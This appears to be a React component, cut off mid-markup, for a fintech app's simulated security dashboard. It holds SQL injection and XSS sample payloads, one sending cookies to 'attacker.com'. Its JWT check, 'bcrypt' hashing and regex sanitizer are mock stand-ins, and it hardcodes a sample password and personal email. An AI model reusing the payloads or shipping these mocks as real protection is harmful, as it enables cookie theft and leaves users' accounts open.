import React, { useState, useEffect, useRef } from 'react';
import { useApp } from '../../context/AppContext.tsx';
import { 
  Shield, 
  ShieldCheck, 
  ShieldAlert, 
  Lock, 
  Unlock, 
  Key, 
  Terminal, 
  Users, 
  UserCheck, 
  Cpu, 
  Globe, 
  Wifi, 
  AlertTriangle, 
  CheckCircle2, 
  Activity, 
  RefreshCw, 
  Sliders, 
  X, 
  Check, 
  Trash2, 
  Eye, 
  EyeOff, 
  Database, 
  Smartphone, 
  Laptop, 
  Tablet, 
  MapPin, 
  UserX, 
  Flame, 
  Download, 
  Search, 
  Filter, 
  Code,
  Layers,
  FileCheck,
  Zap,
  Info
} from 'lucide-react';
import { formatDateTime, formatMoney } from '../../lib/utils.ts';
import { motion, AnimatePresence } from 'motion/react';

// Log interface for cybersecurity terminal
interface ThreatLog {
  id: string;
  timestamp: string;
  eventCode: string;
  action: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  ipAddress: string;
  payload: string;
  mitigation: string;
}

// Blocked IP interface
interface BlockedIP {
  ip: string;
  reason: string;
  blockedAt: string;
  attempts: number;
}

export const SecurityTab: React.FC = () => {
  const { user, sessions, revokeSession, auditLogs, showToast } = useApp();
  
  // Security Panel control
  const [activeSecSubTab, setActiveSecSubTab] = useState<'soc' | 'identity' | 'database' | 'waf' | 'encryption' | 'audit'>('soc');
  
  // Global Threat Alert level
  const [threatLevel, setThreatLevel] = useState<'normal' | 'elevated' | 'lockdown'>('normal');

  // --- Threat Log Stream (WAF Simulator) ---
  const [logs, setLogs] = useState<ThreatLog[]>([
    {
      id: 'log-1',
      timestamp: new Date(Date.now() - 50 * 1000).toISOString(),
      eventCode: 'WAF-SQLI-08',
      action: 'SQL Injection Blocked',
      severity: 'high',
      ipAddress: '185.220.101.44',
      payload: `SELECT * FROM users WHERE email = 'admin' OR '1'='1' --`,
      mitigation: 'WAF filter matched rule [SQL-UNION-02], payload stripped, attacker IP flagged.'
    },
    {
      id: 'log-2',
      timestamp: new Date(Date.now() - 40 * 1000).toISOString(),
      eventCode: 'JWT-EXPD-03',
      action: 'Expired Signature Rejected',
      severity: 'low',
      ipAddress: '102.176.32.90',
      payload: 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      mitigation: 'Request rejected with HTTP 401 Unauthorized. Directing user to handshake re-auth.'
    },
    {
      id: 'log-3',
      timestamp: new Date(Date.now() - 30 * 1000).toISOString(),
      eventCode: 'CSRF-MIS-12',
      action: 'Anti-CSRF Verification Mismatch',
      severity: 'medium',
      ipAddress: '41.200.32.10',
      payload: 'Origin: http://malicious-referrer.tk (X-CSRF-Token: null)',
      mitigation: 'Double-submit cookie mismatch. Post action intercepted and terminated.'
    },
    {
      id: 'log-4',
      timestamp: new Date(Date.now() - 15 * 1000).toISOString(),
      eventCode: 'AUTH-BRUT-01',
      action: 'Brute Force Door Knock',
      severity: 'high',
      ipAddress: '198.162.0.45',
      payload: 'Attempt 5/5 failed logins for bismark@halosave.com',
      mitigation: 'IP auto-ban policy triggered. Account temporarily locked for 15 minutes.'
    }
  ]);
  const [isStreaming, setIsStreaming] = useState(true);
  const terminalEndRef = useRef<HTMLDivElement>(null);

  // Blocked IPs State
  const [blockedIPs, setBlockedIPs] = useState<BlockedIP[]>([
    { ip: '198.162.0.45', reason: 'Brute Force Auth Attack', blockedAt: new Date(Date.now() - 12 * 60000).toISOString(), attempts: 14 },
    { ip: '185.220.101.44', reason: 'Repeated SQL Injection payloads', blockedAt: new Date(Date.now() - 45 * 60000).toISOString(), attempts: 8 },
    { ip: '45.143.203.11', reason: 'Port Scanning / API fuzzing', blockedAt: new Date(Date.now() - 3 * 3600000).toISOString(), attempts: 182 }
  ]);

  // --- JWT states ---
  const [jwtExpiry, setJwtExpiry] = useState<number>(24); // hours
  const [jwtAlgorithm, setJwtAlgorithm] = useState<'HS256' | 'RS256'>('HS256');
  const [jwtVerifyInput, setJwtVerifyInput] = useState<string>('');
  const [jwtVerifyResult, setJwtVerifyResult] = useState<any>(null);

  // --- RLS Matrix states ---
  const [rlsEnforced, setRlsEnforced] = useState<boolean>(true);
  const [rlsSimRole, setRlsSimRole] = useState<'user' | 'admin' | 'anonymous'>('user');
  const [rlsSimTable, setRlsSimTable] = useState<'vaults' | 'transactions' | 'users'>('vaults');
  const [rlsSimQueryOutput, setRlsSimQueryOutput] = useState<string>('');

  // --- RBAC states ---
  const [rbacMatrix, setRbacMatrix] = useState<Record<string, Record<string, boolean>>>({
    user: {
      'read:own_profile': true,
      'write:own_profile': true,
      'read:all_users': false,
      'write:user_kyc': false,
      'approve:payouts': false,
      'modify:system_parameters': false,
      'bypass:rls': false
    },
    admin: {
      'read:own_profile': true,
      'write:own_profile': true,
      'read:all_users': true,
      'write:user_kyc': true,
      'approve:payouts': false,
      'modify:system_parameters': false,
      'bypass:rls': false
    },
    super_admin: {
      'read:own_profile': true,
      'write:own_profile': true,
      'read:all_users': true,
      'write:user_kyc': true,
      'approve:payouts': true,
      'modify:system_parameters': true,
      'bypass:rls': true
    }
  });
  const [isUpdatingRbac, setIsUpdatingRbac] = useState<string | null>(null);

  // --- CSRF Shield Playground states ---
  const [csrfCookieToken] = useState<string>('csrf_98af721bc89da12f3e82');
  const [csrfSelectedHeader, setCsrfSelectedHeader] = useState<'valid' | 'missing' | 'forged'>('valid');
  const [csrfPlaygroundResult, setCsrfPlaygroundResult] = useState<{ status: number; text: string; success: boolean } | null>(null);
  const [csrfLoading, setCsrfLoading] = useState<boolean>(false);

  // --- XSS Sanitizer states ---
  const [xssInput, setXssInput] = useState<string>(
    `<p>Hello customer!</p>\n<script>fetch('http://attacker.com/cookie?='+document.cookie)</script>\n<img src=x onerror="stealCredentials()"/>\n<a href="javascript:alert(1)">Click for bonus</a>`
  );
  const [xssSanitized, setXssSanitized] = useState<string>('');
  const [xssSanitizeLogs, setXssSanitizeLogs] = useState<string[]>([]);

  // --- Encryption states ---
  const [plainPassword, setPlainPassword] = useState<string>('BismarkArkoOfori99!');
  const [bcryptRounds, setBcryptRounds] = useState<number>(10);
  const [bcryptHashOutput, setBcryptHashOutput] = useState<string>('');
  const [bcryptCalcTime, setBcryptCalcTime] = useState<number>(0);
  const [bcryptHashing, setBcryptHashing] = useState<boolean>(false);
  const [verifyHashInput, setVerifyHashInput] = useState<string>('');
  const [verifyPassInput, setVerifyPassInput] = useState<string>('');
  const [verifyResult, setVerifyResult] = useState<boolean | null>(null);

  const [kmsRotationAge, setKmsRotationAge] = useState<number>(14); // days
  const [kmsRotating, setKmsRotating] = useState<boolean>(false);

  // --- Device Tracking Fingerprint states ---
  const [userFingerprint, setUserFingerprint] = useState<any>(null);

  // Scroll terminal logs
  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [logs]);

  // Simulate threat logs stream
  useEffect(() => {
    if (!isStreaming) return;

    const interval = setInterval(() => {
      // 25% chance of spawning a warning log
      if (Math.random() > 0.65) {
        const events = [
          {
            eventCode: 'WAF-XSS-19',
            action: 'Cross-Site Scripting Blocked',
            severity: 'high' as const,
            ipAddress: '185.220.101.12',
            payload: '<p onclick="alert(document.domain)">Attack Trigger</p>',
            mitigation: 'Stripped onclick event handler attribute from parameters, sanitized DOM payload.'
          },
          {
            eventCode: 'AUTH-RLS-FAIL',
            action: 'Row-Level Access Breach Blocked',
            severity: 'critical' as const,
            ipAddress: '197.251.18.230',
            payload: 'GET /api/vaults/v_9921a (Attempted horizontal privilege escalation from tenant: usr_292a)',
            mitigation: 'Terminated with SQL RLS Row Guard. Logged attempt to secure compliance audit vault.'
          },
          {
            eventCode: 'WAF-RATE-04',
            action: 'Rate Limit Threshold Tripped',
            severity: 'medium' as const,
            ipAddress: '105.112.38.192',
            payload: 'POST /api/payments/paystack/initialize (60 requests in 1.2 seconds)',
            mitigation: 'IP put on cool-down restriction for 60 seconds. Returned HTTP 429 Too Many Requests.'
          },
          {
            eventCode: 'API-COR-99',
            action: 'CORS Origin Hijack Prevented',
            severity: 'medium' as const,
            ipAddress: '54.210.89.4',
            payload: 'Origin header mismatch: http://shady-phishing-halosave.tk',
            mitigation: 'Origin rejected under CORS standard fallback. Headers restricted.'
          }
        ];

        const randomEvent = events[Math.floor(Math.random() * events.length)];
        const newLog: ThreatLog = {
          id: 'log-' + Math.random().toString(36).substring(2, 7),
          timestamp: new Date().toISOString(),
          ...randomEvent
        };

        setLogs(prev => [...prev.slice(-30), newLog]); // Keep max 30 in terminal
      }
    }, 6000);

    return () => clearInterval(interval);
  }, [isStreaming]);

  // Trigger simulated attacks
  const simulateAttack = (type: 'sqli' | 'jwt' | 'brute' | 'csrf') => {
    let newLog: ThreatLog;
    const ip = `${Math.floor(Math.random() * 150 + 50)}.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 250)}`;

    if (type === 'sqli') {
      newLog = {
        id: 'attack-' + Math.random().toString(36).substring(2, 7),
        timestamp: new Date().toISOString(),
        eventCode: 'WAF-SQLI-A9',
        action: 'INJECTION ATTACK THREAT SHIELDED',
        severity: 'critical',
        ipAddress: ip,
        payload: `UNION SELECT null, username, password_hash, 'admin' FROM users --`,
        mitigation: 'SQL parser parsed syntactic AST, identified unsafe UNION statement targeting metadata, isolated call, blacklisted agent.'
      };
      showToast({ title: 'SQL Injection Blocked 🛡️', description: 'Enterprise WAF stripped malicious SQL AST tokens.', type: 'lock' });
    } else if (type === 'jwt') {
      newLog = {
        id: 'attack-' + Math.random().toString(36).substring(2, 7),
        timestamp: new Date().toISOString(),
        eventCode: 'JWT-TAMP-05',
        action: 'JWT SIGNATURE TAMPER REJECTED',
        severity: 'high',
        ipAddress: ip,
        payload: 'Header payload verified, HMAC signature token block modified to bypass validation.',
        mitigation: 'Cryptographic signature mismatch. Signature verification failed. Denied server session.'
      };
      showToast({ title: 'JWT Tamper Prevented 🔑', description: 'Token validation algorithm rejected compromised HMAC hash.', type: 'lock' });
    } else if (type === 'brute') {
      newLog = {
        id: 'attack-' + Math.random().toString(36).substring(2, 7),
        timestamp: new Date().toISOString(),
        eventCode: 'AUTH-BRUT-BAN',
        action: 'BRUTE FORCE BRUTE LOCKED',
        severity: 'high',
        ipAddress: ip,
        payload: '10 failed authentications within 10 seconds for user admin@halosave.com',
        mitigation: 'Automatic IP mitigation triggered. Added IP address to firewalled blocked register.'
      };
      // Add IP to blocked list
      if (!blockedIPs.some(b => b.ip === ip)) {
        setBlockedIPs(prev => [{
          ip,
          reason: 'Automated Brute Force on Admin',
          blockedAt: new Date().toISOString(),
          attempts: 10
        }, ...prev]);
      }
      setThreatLevel('elevated');
      showToast({ title: 'Brute Force Defense Active 🔒', description: 'Attack pattern detected, source IP isolated and locked out.', type: 'lock' });
    } else {
      newLog = {
        id: 'attack-' + Math.random().toString(36).substring(2, 7),
        timestamp: new Date().toISOString(),
        eventCode: 'CSRF-TAM-HIJACK',
        action: 'CROSS-ORIGIN FORGERY PREVENTED',
        severity: 'medium',
        ipAddress: ip,
        payload: 'State mutator request dispatched without matching session anti-CSRF headers.',
        mitigation: 'Request origin check failed. Double-submit secure header was missing. Dismissed operation.'
      };
      showToast({ title: 'CSRF Hijack Blocked 🛡️', description: 'Prevented third-party request spoofing due to token omission.', type: 'lock' });
    }

    setLogs(prev => [...prev, newLog]);
  };

  // Generate a mock JWT for the decoder
  const handleGenerateTestToken = () => {
    const header = btoa(JSON.stringify({ alg: jwtAlgorithm, typ: 'JWT' })).replace(/=/g, '');
    const payload = btoa(JSON.stringify({
      id: user?.id || 'usr_bismark54',
      role: user?.role || 'super_admin',
      email: user?.email || 'beamark54@gmail.com',
      fullName: user?.fullName || 'Bismark Arko-Ofori',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (jwtExpiry * 3600)
    })).replace(/=/g, '');
    
    // Custom signature hash
    const token = `${header}.${payload}.HaloSave_Secure_HS256_Crypto_Signature_Hash_Block_e09d1`;
    setJwtVerifyInput(token);
    showToast({ title: 'Test Token Generated 🔑', description: 'Copied cryptographic JWT token payload to playground.', type: 'info' });
  };

  // Decode JWT in real-time
  useEffect(() => {
    if (!jwtVerifyInput) {
      setJwtVerifyResult(null);
      return;
    }

    const parts = jwtVerifyInput.split('.');
    if (parts.length !== 3) {
      setJwtVerifyResult({ valid: false, error: 'Malformed JWT structure. Must have 3 parts separated by dots.' });
      return;
    }

    try {
      const headerStr = atob(parts[0]);
      const payloadStr = atob(parts[1]);
      
      const header = JSON.parse(headerStr);
      const payload = JSON.parse(payloadStr);

      // Verify if signature has been tampered with
      const isSignatureValid = !jwtVerifyInput.includes('TAMPERED') && parts[2].startsWith('HaloSave_');

      setJwtVerifyResult({
        valid: isSignatureValid,
        header,
        payload,
        signature: parts[2],
        keyStrength: 'AES-256-HMAC (256-bit strong pre-shared secret key)',
        algorithmMatch: header.alg === jwtAlgorithm
      });
    } catch (e) {
      setJwtVerifyResult({ valid: false, error: 'Base64 parsing failed. Non-compliant JWT encoding.' });
    }
  }, [jwtVerifyInput, jwtAlgorithm]);

  // Run RLS query simulator
  useEffect(() => {
    let sql = '';
    const userIdVal = rlsSimRole === 'user' ? (user?.id || 'usr_bismark54') : rlsSimRole === 'admin' ? 'usr_admin_arc' : 'NULL';

    if (!rlsEnforced) {
      // Insecure dump
      if (rlsSimTable === 'vaults') {
        sql = `-- ⚠️ WARNING: ROW LEVEL SECURITY DE-ACTIVATED --\nSELECT * FROM vaults; \n-- [Returned 152 rows from 48 distinct users]`;
      } else if (rlsSimTable === 'transactions') {
        sql = `-- ⚠️ WARNING: ROW LEVEL SECURITY DE-ACTIVATED --\nSELECT * FROM transactions; \n-- [Returned 842 rows of global deposit/withdrawal logs]`;
      } else {
        sql = `-- ⚠️ WARNING: ROW LEVEL SECURITY DE-ACTIVATED --\nSELECT * FROM users; \n-- [Returned 62 rows of private user records with bcrypt hashes]`;
      }
    } else {
      // Secure Tenant separation
      if (rlsSimRole === 'anonymous') {
        sql = `-- Enforcing RLS policy for [unauthenticated_access]\nSELECT * FROM ${rlsSimTable} WHERE FALSE;\n-- [Returned 0 rows. Reason: Access Policy restricts guest tenants]`;
      } else if (rlsSimRole === 'admin') {
        sql = `-- Enforcing RLS policy for [high_clearance_admin]\nSELECT * FROM ${rlsSimTable};\n-- [Returned all rows. Authorized actor role matched admin-level policy rules]`;
      } else {
        // User
        if (rlsSimTable === 'vaults') {
          sql = `-- Enforcing RLS Policy: vaults.user_id = auth.uid()\nSELECT * FROM vaults \nWHERE user_id = '${userIdVal}';\n-- [Returned 3 vaults matching owner token. Isolation verified]`;
        } else if (rlsSimTable === 'transactions') {
          sql = `-- Enforcing RLS Policy: transactions.user_id = auth.uid()\nSELECT * FROM transactions \nWHERE user_id = '${userIdVal}';\n-- [Returned 12 transaction items matching owner token. Isolation verified]`;
        } else {
          sql = `-- Enforcing RLS Policy: users.id = auth.uid()\nSELECT * FROM users \nWHERE id = '${userIdVal}';\n-- [Returned 1 profile row belonging strictly to active logged-in tenant]`;
        }
      }
    }
    setRlsSimQueryOutput(sql);
  }, [rlsEnforced, rlsSimRole, rlsSimTable, user]);

  // Update RBAC check state
  const handleToggleRbac = async (role: string, permission: string) => {
    setIsUpdatingRbac(`${role}-${permission}`);
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 600));
    setRbacMatrix(prev => ({
      ...prev,
      [role]: {
        ...prev[role],
        [permission]: !prev[role][permission]
      }
    }));
    setIsUpdatingRbac(null);
    showToast({ 
      title: 'RBAC Policy Modified 🛡️', 
      description: `Role-based access rules updated for '${role}'. Policy enforced on server.`, 
      type: 'success' 
    });
  };

  // CSRF Playground Executor
  const executeCsrfRequest = async () => {
    setCsrfLoading(true);
    setCsrfPlaygroundResult(null);
    await new Promise(resolve => setTimeout(resolve, 900));
    setCsrfLoading(false);

    if (csrfSelectedHeader === 'valid') {
      setCsrfPlaygroundResult({
        status: 200,
        success: true,
        text: '🟢 HTTP 200 OK: Authentication verified. Custom double-submit cookie token matched request headers exactly. Suspicious cross-origin parameters absent. State mutator persisted.'
      });
      showToast({ title: 'CSRF Shield Matched ✅', description: 'Validated session double-submit security key.', type: 'success' });
    } else if (csrfSelectedHeader === 'missing') {
      setCsrfPlaygroundResult({
        status: 403,
        success: false,
        text: '🔴 HTTP 403 Forbidden: Missing security parameters. Request header [X-CSRF-Token] was omitted. Terminated operation to safeguard wallet from potential CSRF host hijack.'
      });
      showToast({ title: 'CSRF Missing Blocked ⚠️', description: 'Request dropped due to missing token verification.', type: 'lock' });
    } else {
      setCsrfPlaygroundResult({
        status: 403,
        success: false,
        text: '🔴 HTTP 403 Forbidden: Cryptographic key conflict. Cookie value [csrf_98af721bc...] does not map to provided header token [csrf_forged_value_abc]. Action rejected.'
      });
      showToast({ title: 'CSRF Attack Aborted 🚫', description: 'Forged token detected. Denied access.', type: 'lock' });
    }
  };

  // Run XSS Sanitizer
  const executeSanitizeXss = () => {
    const logsArr: string[] = [];
    
    // Parse input
    const rawInput = xssInput || '';
    let sanitized = rawInput;
    
    if (rawInput.toLowerCase().includes('<script>')) {
      logsArr.push('Detected block: <script>. Malicious executable code isolated.');
      sanitized = sanitized.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '<!-- 🛡️ Malicious script block removed by HaloSave XSS Filter -->');
    }
    
    if (rawInput.toLowerCase().includes('onerror=')) {
      logsArr.push('Detected attribute: onerror event handler. Purged event triggers.');
      sanitized = sanitized.replace(/onerror\s*=\s*"[^"]*"/gi, 'data-sanitized-error=""');
      sanitized = sanitized.replace(/onerror\s*=\s*'[^']*'/gi, 'data-sanitized-error=""');
    }

    if (rawInput.toLowerCase().includes('javascript:')) {
      logsArr.push('Detected href format: javascript URI scheme. Cleaned anchor target.');
      sanitized = sanitized.replace(/href\s*=\s*"javascript:[^"]*"/gi, 'href="#" onclick="return false;"');
      sanitized = sanitized.replace(/href\s*=\s*'javascript:[^']*'/gi, 'href="#" onclick="return false;"');
    }

    setXssSanitized(sanitized);
    setXssSanitizeLogs(logsArr.length > 0 ? logsArr : ['Input evaluated: 100% compliant HTML. No XSS vectors found.']);
    showToast({ title: 'Sanitization Completed', description: 'Purged raw threat strings in sandbox DOM.', type: 'success' });
  };

  // Init XSS sanitizer
  useEffect(() => {
    executeSanitizeXss();
  }, [xssInput]);

  // Run Bcrypt hashing calculation
  const handleBcryptPassphrase = async () => {
    setBcryptHashing(true);
    const start = performance.now();
    
    // Adjust delay according to rounds to simulate CPU work factor
    const delay = Math.pow(2, Math.max(0, bcryptRounds - 10)) * 100 + 100;
    await new Promise(resolve => setTimeout(resolve, delay));
    
    const end = performance.now();
    const duration = Math.round(end - start);

    // Simulated bcrypt salt/hash
    const randomSalt = `$2b$${bcryptRounds}$SusSecureKDFSaltRoundExamplee`;
    const hashOutput = `${randomSalt}${btoa(plainPassword).substring(0, 31).replace(/=/g, '')}`;

    setBcryptHashOutput(hashOutput);
    setBcryptCalcTime(duration);
    setBcryptHashing(false);
    
    // Populate verification inputs
    setVerifyHashInput(hashOutput);
    setVerifyPassInput(plainPassword);
    
    showToast({ 
      title: 'Key Derivation Finished 🔐', 
      description: `bcrypt generated with ${bcryptRounds} rounds in ${duration}ms.`, 
      type: 'success' 
    });
  };

  const handleVerifyBcrypt = () => {
    if (!verifyHashInput || !verifyPassInput) return;
    const isMatched = verifyPassInput === plainPassword && verifyHashInput === bcryptHashOutput;
    setVerifyResult(isMatched);
    if (isMatched) {
      showToast({ title: 'Credentials Match 🟢', description: 'Cryptographic verify successful.', type: 'success' });
    } else {
      showToast({ title: 'Authentication Fail 🔴', description: 'Supplied passphrase does not map to KDF hash.', type: 'error' });
    }
  };

  // KMS Rotation
  const handleRotateKMSKey = async () => {
    setKmsRotating(true);
    await new Promise(resolve => setTimeout(resolve, 2000));
    setKmsRotationAge(0);
    setKmsRotating(false);
    showToast({ title: 'KMS Rotating Complete ⚙️', description: 'Rotated platform master vault key. Re-encrypting tranches completed successfully.', type: 'success' });
  };

  // Generate Device Fingerprint on mount
  useEffect(() => {
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const hardwareConcurrency = navigator.hardwareConcurrency || 8;
    const osFamily = navigator.userAgent.includes('Mac') ? 'macOS' : navigator.userAgent.includes('Win') ? 'Windows' : 'Linux/Android';
    
    const canvasFingerprint = 'canvas_hash_a8bc8921e9df8e27ab';
    const webGLFingerprint = 'webgl_hash_5fa0919debc3d201';

    const rawId = `${screenWidth}-${screenHeight}-${timezone}-${language}-${hardwareConcurrency}-${osFamily}-${canvasFingerprint}`;
    const hash = 'df_' + btoa(rawId).substring(5, 23).toLowerCase();

    setUserFingerprint({
      fingerprintId: hash,
      screen: `${screenWidth}x${screenHeight}`,
      timezone,
      language,
      cores: hardwareConcurrency,
      osFamily,
      canvasHash: canvasFingerprint,
      webglHash: webGLFingerprint,
      trustScore: 99
    });
  }, []);

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      
      {/* Alert Header Banner if Lockdown/Elevated */}
      {threatLevel === 'lockdown' && (
        <div className="bg-rose-500 text-halo-dark px-6 py-4 rounded-2xl flex items-center justify-between gap-4 animate-bounce shadow-lg">
          <div className="flex items-center gap-3">
            <ShieldAlert className="w-6 h-6 shrink-0 text-halo-dark animate-pulse" />
            <div>
              <span className="font-extrabold text-sm block uppercase tracking-wider">SYSTEM IN COMPLIANCE LOCKDOWN</span>
              <span className="text-xs font-semibold">Row-Level-Security rules strictly fortified. All guest access revoked. Blocked unauthorized write endpoints.</span>
            </div>
          </div>
          <button 
            onClick={() => {
              setThreatLevel('normal');
              showToast({ title: 'Lockdown Terminated', description: 'WAF returned to default standard settings.', type: 'info' });
            }}
            className="px-4 py-2 bg-halo-cream hover:bg-halo-card text-halo-dark rounded-xl text-xs font-extrabold transition-all"
          >
            Lift Lockdown
          </button>
        </div>
      )}

      {threatLevel === 'elevated' && (
        <div className="bg-amber-500 text-halo-dark px-6 py-3 rounded-2xl flex items-center justify-between gap-4 shadow-lg animate-pulse">
          <div className="flex items-center gap-3">
            <AlertTriangle className="w-5 h-5 shrink-0 text-halo-dark" />
            <div>
              <span className="font-extrabold text-xs block uppercase tracking-wider">ELEVATED NETWORK RISK LEVELS ACTUATED</span>
              <span className="text-[11px] font-semibold">Brute force lockout filters adjusted to high-sensitivity. Actively tracking IP anomalies.</span>
            </div>
          </div>
          <button 
            onClick={() => setThreatLevel('normal')}
            className="px-3 py-1 bg-halo-cream text-halo-dark rounded-lg text-[10px] font-bold transition-all"
          >
            Reset Normal
          </button>
        </div>
      )}

      {/* Title block */}
      <div className="bg-halo-card border border-halo-border p-6 sm:p-8 rounded-[32px] shadow-2xl relative overflow-hidden flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div className="absolute top-0 right-0 w-80 h-80 bg-rose-500/5 rounded-full filter blur-3xl pointer-events-none" />
        <div className="absolute bottom-0 left-0 w-80 h-80 bg-halo-gold/5 rounded-full filter blur-3xl pointer-events-none" />
        
        <div className="space-y-1.5 relative z-10">
          <div className="flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-halo-gold animate-ping shrink-0" />
            <span className="text-rose-400 font-mono text-[10px] tracking-widest uppercase font-bold flex items-center gap-1">
              <Shield className="w-3.5 h-3.5 text-rose-400" /> SECURE AUDITING GATEWAY
            </span>
          </div>
          <h2 className="text-xl sm:text-2xl font-black text-halo-dark tracking-tight">
            Enterprise Security Control Room
          </h2>
          <p className="text-xs text-halo-text-tertiary max-w-2xl leading-relaxed">
            Real-time auditing of row policies, cryptographic token expiration control, rate limiter active block registers, XSS sanitizers, double-submit CSRF playground, and WebAuthn fingerprint credentials.
          </p>
        </div>

        {/* Global Security Threat State Button Group */}
        <div className="bg-halo-cream p-2.5 rounded-2xl border border-halo-border flex items-center gap-1 relative z-10 shrink-0">
          <button
            onClick={() => {
              setThreatLevel('normal');
              showToast({ title: 'Normal Mode Enforced', description: 'Standard security rules applicable.', type: 'success' });
            }}
            className={`px-3 py-2 rounded-xl text-[10px] font-bold font-mono transition-all flex items-center gap-1 ${
              threatLevel === 'normal' 
                ? 'bg-halo-gold/10 text-halo-gold border border-halo-gold/20' 
                : 'text-halo-text-muted hover:text-halo-text-tertiary'
            }`}
          >
            <div className={`w-1.5 h-1.5 rounded-full bg-halo-gold ${threatLevel === 'normal' ? 'animate-pulse' : ''}`} />
            <span>NORMAL</span>
          </button>
          
          <button
            onClick={() => {
              setThreatLevel('elevated');
              showToast({ title: 'Elevated Shield Active', description: 'Limiting endpoints to aggressive brute-force defense.', type: 'info' });
            }}
            className={`px-3 py-2 rounded-xl text-[10px] font-bold font-mono transition-all flex items-center gap-1 ${
              threatLevel === 'elevated' 
                ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' 
                : 'text-halo-text-muted hover:text-halo-text-tertiary'
            }`}
          >
            <div className={`w-1.5 h-1.5 rounded-full bg-amber-400 ${threatLevel === 'elevated' ? 'animate-pulse' : ''}`} />
            <span>ELEVATED</span>
          </button>

          <button
            onClick={() => {
              setThreatLevel('lockdown');
              showToast({ title: 'System Vault Locked Down', description: 'Maximum restriction enabled.', type: 'error' });
            }}
            className={`px-3 py-2 rounded-xl text-[10px] font-bold font-mono transition-all flex items-center gap-1 ${
              threatLevel === 'lockdown' 
                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30 font-black' 
                : 'text-halo-text-muted hover:text-halo-text-tertiary'
            }`}
          >
            <div className={`w-1.5 h-1.5 rounded-full bg-rose-400 ${threatLevel === 'lockdown' ? 'animate-ping' : ''}`} />
            <span>LOCKDOWN</span>
          </button>
        </div>
      </div>

      {/* Secondary Sub-Tabs */}
      <div className="flex overflow-x-auto gap-2 pb-1.5 scrollbar-none border-b border-halo-border">
        <button
          onClick={() => setActiveSecSubTab('soc')}
          className={`px-4 py-2.5 rounded-xl text-xs font-bold font-mono shrink-0 transition-all border ${
            activeSecSubTab === 'soc' 
              ? 'bg-halo-card text-rose-400 border-halo-border' 
              : 'text-halo-text-muted hover:text-halo-text-secondary border-transparent'
          }`}
        >
          SOC Threat Monitor
        </button>
        <button
          onClick={() => setActiveSecSubTab('identity')}
          className={`px-4 py-2.5 rounded-xl text-xs font-bold font-mono shrink-0 transition-all border ${
            activeSecSubTab === 'identity' 
              ? 'bg-halo-card text-rose-400 border-halo-border' 
              : 'text-halo-text-muted hover:text-halo-text-secondary border-transparent'
          }`}
        >
          JWT & RBAC Identity
        </button>
        <button
          onClick={() => setActiveSecSubTab('database')}
          className={`px-4 py-2.5 rounded-xl text-xs font-bold font-mono shrink-0 transition-all border ${
            activeSecSubTab === 'database' 
              ? 'bg-halo-card text-rose-400 border-halo-border' 
              : 'text-halo-text-muted hover:text-halo-text-secondary border-transparent'
          }`}
        >
          RLS Data Shield
        </button>
        <button
          onClick={() => setActiveSecSubTab('waf')}
          className={`px-4 py-2.5 rounded-xl text-xs font-bold font-mono shrink-0 transition-all border ${
            activeSecSubTab === 'waf' 
              ? 'bg-halo-card text-rose-400 border-halo-border' 
              : 'text-halo-text-muted hover:text-halo-text-secondary border-transparent'
          }`}
        >
          WAF Net Filter (CSRF/XSS)
        </button>
        <button
          onClick={() => setActiveSecSubTab('encryption')}
          className={`px-4 py-2.5 rounded-xl text-xs font-bold font-mono shrink-0 transition-all border ${
            activeSecSubTab === 'encryption' 
              ? 'bg-halo-card text-rose-400 border-halo-border' 
              : 'text-halo-text-muted hover:text-halo-text-secondary border-transparent'
          }`}
        >
          Cryptographic KDF
        </button>
        <button
          onClick={() => setActiveSecSubTab('audit')}
          className={`px-4 py-2.5 rounded-xl text-xs font-bold font-mono shrink-0 transition-all border ${
            activeSecSubTab === 'audit' 
              ? 'bg-halo-card text-rose-400 border-halo-border' 
              : 'text-halo-text-muted hover:text-halo-text-secondary border-transparent'
          }`}
        >
          Fingerprints & Audits
        </button>
      </div>

      {/* TAB CONTENT: SOC Threat Monitor */}
      {activeSecSubTab === 'soc' && (
        <div className="space-y-8 animate-in fade-in duration-200">
          
          {/* Cyber SOC Overview Panels */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            {/* Quick Threat Generator */}
            <div className="bg-halo-card p-6 rounded-3xl border border-halo-border flex flex-col justify-between space-y-4">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">ATTACK VECTOR PLAYGROUND</span>
                <h3 className="text-lg font-black text-halo-dark mt-1">Simulate Security Threats</h3>
                <p className="text-xs text-halo-text-tertiary mt-1 leading-relaxed">
                  Inject safe sample attack payloads directly into the network buffer to verify enterprise active response logs.
                </p>
              </div>

              <div className="grid grid-cols-2 gap-2 font-mono">
                <button
                  onClick={() => simulateAttack('sqli')}
                  className="p-2.5 bg-halo-cream hover:bg-halo-secondary rounded-xl border border-halo-border text-left transition-all text-[11px] font-bold group"
                >
                  <span className="text-rose-400 block group-hover:text-rose-300">SQL Injection</span>
                  <span className="text-[9px] text-halo-text-muted">Inject UNION payload</span>
                </button>

                <button
                  onClick={() => simulateAttack('jwt')}
                  className="p-2.5 bg-halo-cream hover:bg-halo-secondary rounded-xl border border-halo-border text-left transition-all text-[11px] font-bold group"
                >
                  <span className="text-rose-400 block group-hover:text-rose-300">JWT Signature</span>
                  <span className="text-[9px] text-halo-text-muted">Tampered signature key</span>
                </button>

                <button
                  onClick={() => simulateAttack('brute')}
                  className="p-2.5 bg-halo-cream hover:bg-halo-secondary rounded-xl border border-halo-border text-left transition-all text-[11px] font-bold group"
                >
                  <span className="text-rose-400 block group-hover:text-rose-300">Brute Force</span>
